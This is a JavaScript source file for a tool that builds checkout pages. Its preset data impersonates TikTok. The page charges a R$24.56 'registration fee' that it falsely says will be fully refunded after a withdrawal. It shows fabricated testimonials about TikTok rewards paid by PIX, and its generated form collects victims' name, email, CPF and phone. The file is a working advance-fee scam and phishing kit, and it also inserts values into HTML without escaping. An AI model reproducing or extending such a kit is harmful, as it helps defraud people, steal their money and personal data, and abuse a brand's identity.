// Estado global do checkout
let checkoutData = {
    product: {
        name: 'Taxa de Cadastro',
        description: 'Essa taxa será reembolsada 100% após o saque',
        price: 24.56,
        image: 'https://cdn.optimuspay.io/products/uploads/019c3e60-2266-71ae-9908-a0a466a82fd1.png'
    },
    store: {
        name: 'Tik Tok',
        logo: './img_6988cc48b4e0b7.png',
        cnpj: '27.415.911/0001-36',
        email: 'tiktokpay@contato.com'
    },
    testimonials: [
        {
            name: 'TikTok Brasil',
            image: 'https://cdn.optimuspay.io/stores/6966/theme/img_6988ceb3d04ca9.16287872.webp',
            stars: 5,
            text: '+ de 287.983 Recompensas foram enviadas.'
        },
        {
            name: 'Luana Silva',
            image: 'https://cdn.optimuspay.io/stores/6966/theme/img_696da91fc806b2.89369199.webp',
            stars: 5,
            text: 'Consegui sacar mais de 2 mil reais e paguei o meu aluguel, tiktok sempre salvando a gente quando mais precisamos, obrigado.'
        },
        {
            name: 'Fernando Oliveira',
            image: 'https://cdn.optimuspay.io/stores/6966/theme/img_696da9203b9d41.47431713.webp',
            stars: 5,
            text: 'obrigado tiktok, fiz o passo a passo certinho e o pix caiiu na minha conta.'
        }
    ]
};

// Inicialização
document.addEventListener('DOMContentLoaded', () => {
    loadExample();
    setupEventListeners();
});

function setupEventListeners() {
    // Produto
    document.getElementById('productName').addEventListener('input', (e) => {
        checkoutData.product.name = e.target.value;
        updatePreview();
    });
    
    document.getElementById('productDescription').addEventListener('input', (e) => {
        checkoutData.product.description = e.target.value;
        updatePreview();
    });
    
    document.getElementById('productPrice').addEventListener('input', (e) => {
        checkoutData.product.price = parseFloat(e.target.value) || 0;
        updatePreview();
    });
    
    document.getElementById('productImage').addEventListener('input', (e) => {
        checkoutData.product.image = e.target.value;
        updatePreview();
    });
    
    // Loja
    document.getElementById('storeName').addEventListener('input', (e) => {
        checkoutData.store.name = e.target.value;
        updatePreview();
    });
    
    document.getElementById('logoUrl').addEventListener('input', (e) => {
        checkoutData.store.logo = e.target.value;
        updatePreview();
    });
    
    document.getElementById('cnpj').addEventListener('input', (e) => {
        checkoutData.store.cnpj = e.target.value;
        updatePreview();
    });
    
    document.getElementById('email').addEventListener('input', (e) => {
        checkoutData.store.email = e.target.value;
        updatePreview();
    });
}

function loadExample() {
    document.getElementById('productName').value = checkoutData.product.name;
    document.getElementById('productDescription').value = checkoutData.product.description;
    document.getElementById('productPrice').value = checkoutData.product.price;
    document.getElementById('productImage').value = checkoutData.product.image;
    document.getElementById('storeName').value = checkoutData.store.name;
    document.getElementById('logoUrl').value = checkoutData.store.logo;
    document.getElementById('cnpj').value = checkoutData.store.cnpj;
    document.getElementById('email').value = checkoutData.store.email;
    
    renderTestimonials();
    updatePreview();
}

function renderTestimonials() {
    const container = document.getElementById('testimonials');
    container.innerHTML = '';
    
    checkoutData.testimonials.forEach((testimonial, index) => {
        const div = document.createElement('div');
        div.className = 'testimonial-item';
        div.innerHTML = `
            <input type="text" placeholder="Nome" value="${testimonial.name}" 
                   onchange="updateTestimonial(${index}, 'name', this.value)">
            <input type="url" placeholder="URL da Imagem" value="${testimonial.image}" 
                   onchange="updateTestimonial(${index}, 'image', this.value)">
            <input type="number" placeholder="Estrelas (1-5)" value="${testimonial.stars}" min="1" max="5"
                   onchange="updateTestimonial(${index}, 'stars', this.value)">
            <textarea placeholder="Depoimento" 
                      onchange="updateTestimonial(${index}, 'text', this.value)">${testimonial.text}</textarea>
            <button class="remove-btn" onclick="removeTestimonial(${index})">Remover</button>
        `;
        container.appendChild(div);
    });
}

function addTestimonial() {
    checkoutData.testimonials.push({
        name: 'Nome',
        image: 'https://via.placeholder.com/45',
        stars: 5,
        text: 'Depoimento aqui...'
    });
    renderTestimonials();
    updatePreview();
}

function removeTestimonial(index) {
    checkoutData.testimonials.splice(index, 1);
    renderTestimonials();
    updatePreview();
}

function updateTestimonial(index, field, value) {
    if (field === 'stars') {
        checkoutData.testimonials[index][field] = parseInt(value);
    } else {
        checkoutData.testimonials[index][field] = value;
    }
    updatePreview();
}

function generateStars(count) {
    let stars = '';
    for (let i = 0; i < count; i++) {
        stars += '<span style="cursor: inherit; display: inline-block; position: relative;"><span style="visibility: hidden;"><span style="font-size: 26px; color: rgb(255, 213, 0);">☆</span></span><span style="display: inline-block; position: absolute; overflow: hidden; top: 0px; left: 0px; width: 100%;"><span style="font-size: 26px; color: rgb(255, 213, 0);">★</span></span></span>';
    }
    return stars;
}

function generateTestimonialsHTML() {
    return checkoutData.testimonials.map(t => `<li><img alt="" loading="lazy" width="45" height="45" decoding="async" data-nimg="1" src="${t.image}" style="color: transparent;"><article><span style="display: inline-block; direction: ltr;">${generateStars(t.stars)}</span><strong>${t.name}</strong><p>${t.text}</p></article></li>`).join('');
}

async function updatePreview() {
    const iframe = document.getElementById('preview');
    
    try {
        // Enviar dados para o PHP fazer a substituição
        const response = await fetch('preview.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(checkoutData)
        });
        
        const html = await response.text();
        iframe.srcdoc = html;
        
        console.log(`✅ Preview atualizado`);
    } catch (error) {
        console.error('Erro ao carregar preview:', error);
        alert('Erro: Certifique-se de que está rodando em um servidor PHP (localhost)');
    }
}

async function generateCheckout() {
    const btn = event.target;
    const originalText = btn.textContent;
    btn.textContent = 'Gerando...';
    btn.disabled = true;
    
    try {
        const response = await fetch('generate-checkout.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(checkoutData)
        });
        
        const result = await response.json();
        
        if (result.success) {
            alert(`✅ Checkout gerado com sucesso!\n\nID: ${result.checkoutId}\n\nPasta criada em: ${result.path}\n\nAcesse: ${window.location.origin}${result.url}`);
            
            // Abrir o checkout em nova aba
            window.open(result.url, '_blank');
        } else {
            alert(`❌ Erro ao gerar checkout: ${result.error}`);
        }
    } catch (error) {
        console.error('Erro:', error);
        alert('❌ Erro ao gerar checkout. Verifique o console para mais detalhes.');
    } finally {
        btn.textContent = originalText;
        btn.disabled = false;
    }
}

function generateFullHTML() {
    const price = checkoutData.product.price.toFixed(2).replace('.', ',');
    
    return `<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <title>${checkoutData.store.name}</title>
    <link rel="stylesheet" href="a.css">
    <link rel="stylesheet" href="b.css">
    <link rel="stylesheet" href="c.css">
    <link rel="stylesheet" href="d.css">
    <link rel="stylesheet" href="e.css">
    <link rel="stylesheet" href="f.css">
    <link rel="stylesheet" href="g.css">
    <link rel="stylesheet" href="h.css">
    <link rel="stylesheet" href="i.css">
    <link rel="stylesheet" href="j.css">
</head>
<body class="__className_f367f3">
    <input type="hidden" id="checkout-total-amount" data-currency="BRL" value="${checkoutData.product.price}" />
    <div>
        <div class="Modern_container__GUmjF top Rubik Arredondado desktop">
            <div class="HeaderCheckout_header__9QnWb Esquerda Modern top desktop HeaderCheckout_headerMargin__kkEba">
                <div class="Modern_containerHeader__hSFst HeaderCheckout_headerLogo__F6Suf">
                    <figure>
                        <img alt="Loja" width="150" height="64" decoding="async" data-nimg="1" class="logoUrl" 
                             src="${checkoutData.store.logo}" 
                             style="width: 150px !important; height: 64px !important; object-fit: contain !important;">
                    </figure>
                </div>
            </div>
            
            <div class="Modern_steps__RrNh5">
                <ul class="Modern_stepsMobile__8IQKN desktop">
                    <li class="active"><strong>1</strong><span>Informações pessoais</span></li>
                    <li class=""></li>
                    <li class=""><strong>2</strong><span>Pagamento</span></li>
                </ul>
                
                <div class="Modern_step__gUz3m">
                    <article id="step1-article" class="Modern_article__BzAh_ Modern_artSelected__tV82C">
                        <header class="Modern_stepHeader__GGMWo">
                            <h1><strong>1</strong> Identifique-se</h1>
                            <p>Utilizaremos seu e-mail para: identificar seu perfil, histórico de compra, notificação de pedidos e carrinho de compras.</p>
                        </header>
                        <div>
                            <div class="InputModern_container__Xgq8o">
                                <label for="name">Nome completo</label>
                                <div class="InputModern_inputHolder__zeRbn">
                                    <input id="name" placeholder="ex.: Maria de Almeida Cruz" value="" />
                                </div>
                            </div>
                            <div class="InputModern_container__Xgq8o">
                                <label for="email">E-mail</label>
                                <div class="InputModern_inputHolder__zeRbn">
                                    <input id="email" type="email" value="" />
                                </div>
                            </div>
                            <div class="max-content">
                                <div class="InputModern_container__Xgq8o">
                                    <label for="cpf">CPF</label>
                                    <div class="InputModern_inputHolder__zeRbn">
                                        <input id="cpf" placeholder="000.000.000-00" value="" />
                                    </div>
                                </div>
                            </div>
                            <div class="InputModern_container__Xgq8o">
                                <label for="phone">Celular / Whatsapp</label>
                                <div class="InputModern_inputHolder__zeRbn">
                                    <input id="phone" placeholder="(00) 00000-0000" type="tel" value="" />
                                </div>
                            </div>
                        </div>
                        <div class="Modern_articleHandle__aoI0s">
                            <button class="ButtonModern_button__9yJT9 pulse btnShadow" id="btn-continue-step1">
                                <span>Continuar</span>
                            </button>
                        </div>
                    </article>
                    
                    <div class="ThreeSteps_prAfter__d4BmU">
                        <article class="mt-1 Priorities_articleP__oa_1F shadow">
                            <ul class="Priorities_priorities__GTcAa">
                                ${generateTestimonialsHTML()}
                            </ul>
                        </article>
                    </div>
                </div>
                
                <aside>
                    <section class="ResumeCart_resumeSection__ptmWA">
                        <article class="ResumeCart_article__0z9BI shadow">
                            <div class="ResumeCart_resumeOpen__kas1d open-resume">
                                <h2 class="ResumeCart_resumeTitle__SL7ck">Seu carrinho</h2>
                            </div>
                            <ul class="ResumeCart_products__SzAIV desktop">
                                <li>
                                    <figure>
                                        <img src="${checkoutData.product.image}" alt="${checkoutData.product.name}">
                                        <span class="ResumeCart_quantity__8W919">1</span>
                                    </figure>
                                    <article>
                                        <p>${checkoutData.product.name} - ${checkoutData.product.description}</p>
                                        <div class="ResumeCart_gridPrice__kxkd2">
                                            <strong>R$&nbsp;${price}</strong>
                                        </div>
                                    </article>
                                </li>
                            </ul>
                            <ul class="ResumeCart_price__S9G2Z">
                                <li><span>Subtotal • 1 item</span><div><strong>R$&nbsp;${price}</strong></div></li>
                                <li><strong>Total</strong><div><strong>R$&nbsp;${price}</strong></div></li>
                            </ul>
                        </article>
                    </section>
                    
                    <div class="ThreeSteps_prAfter__d4BmU desktop">
                        <article class="mt-1 Priorities_articleP__oa_1F shadow">
                            <ul class="Priorities_priorities__GTcAa">
                                ${generateTestimonialsHTML()}
                            </ul>
                        </article>
                    </div>
                </aside>
            </div>
            
            <div class="FooterCheckout_footer__H68bd">
                <div class="FooterCheckout_footerContent__MZpfJ">
                    <ul class="FooterCheckout_copy__F_QdP">
                        <li>${checkoutData.store.name}</li>
                        <li>CNPJ: ${checkoutData.store.cnpj}</li>
                        <li>Email: ${checkoutData.store.email}</li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</body>
</html>`;
}

function downloadJSON(data, filename) {
    const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = filename;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
}
